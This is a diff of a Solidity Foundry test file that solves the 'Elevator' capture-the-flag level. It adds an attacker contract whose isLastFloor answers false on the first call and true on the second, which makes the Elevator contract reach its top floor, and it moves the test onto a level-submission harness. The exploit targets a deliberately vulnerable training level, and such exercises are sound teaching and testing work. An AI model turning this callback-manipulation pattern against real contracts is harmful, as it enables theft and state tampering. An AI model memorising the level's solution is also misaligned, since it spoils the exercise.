@@ -1,44 +1,63 @@
 // SPDX-License-Identifier: MIT
+
+import {LevelFactory} from "../utils/LevelFactory.sol";
+import {Elevator, Building} from "../../src/Elevator/Level.sol";
+
 pragma solidity ^0.6.0;
 
-import "tests/Test.sol";
-import "../../src/Elevator/Level.sol";
-import "../utils/Buildling.sol";
-import "forge-std/console.sol";
+contract TheBuilding {
+    bool called;
 
-interface IElevator {
-    function goTo(uint _floor) external;
+    function isLastFloor(uint) external returns (bool) {
+        if (!called) {
+            called = true;
+            return false;
+        } else {
+            return true;
+        }
+    }
 
-    function top() external view returns(bool);
+    function goTo(address elevator, uint _floor) external {
+        elevator.call(abi.encodeWithSignature("goTo(uint256)", _floor));
+    }
 }
 
-contract ElevatorTest is Test {
-    IElevator elevator;
-    Building building;
+pragma solidity ^0.6.0;
 
-    address deployer = address(100);
-    address attacker = address(101);
+interface IElevator {
+  function goTo(uint _floor) external;
 
-    function setUp() public {
-        console.log(deployer, attacker);
-        vm.prank(deployer); // deploy the contract as deployer
-        elevator = IElevator(address(new Elevator()));
-        building = Building(address(new TheBuilding()));
-    }
+  function top() external view returns(bool);
+}
 
-    function testAttack() public {
-        /* Setup stuff, no need to touch */
-        vm.startPrank(attacker);
-        vm.deal(attacker, 5 ether);
+contract ElevatorTest is LevelFactory {
+  IElevator elevator;
+  Building building;
 
-        /* Write your code here */
-        address(building).call(abi.encodeWithSignature("goTo(address,uint256)", address(elevator), 1));
-        /* Write your code here */ 
+  function setUp() public {
+    vm.prank(deployer); // deploy the contract as deployer
+    elevator = IElevator(address(new Elevator()));
+    building = Building(address(new TheBuilding()));
+  }
 
-        /* Validating the test */
-        assertTrue(elevator.top());
-    }
+  function testAttack() public {
+    submitLevel("Elevator");
+  }
 
+  function _performTest() internal override {
+    (bool success,) = address(building).call(abi.encodeWithSignature("goTo(address,uint256)", address(elevator), 1));
+    assert(success);
+  }
+
+  function _setupTest() internal override {
+    vm.startPrank(attacker);
+  }
+
+  function _checkTest() internal override returns (bool) {
+    assertTrue(elevator.top());
+
+    return elevator.top();
+  }
 }
 
 
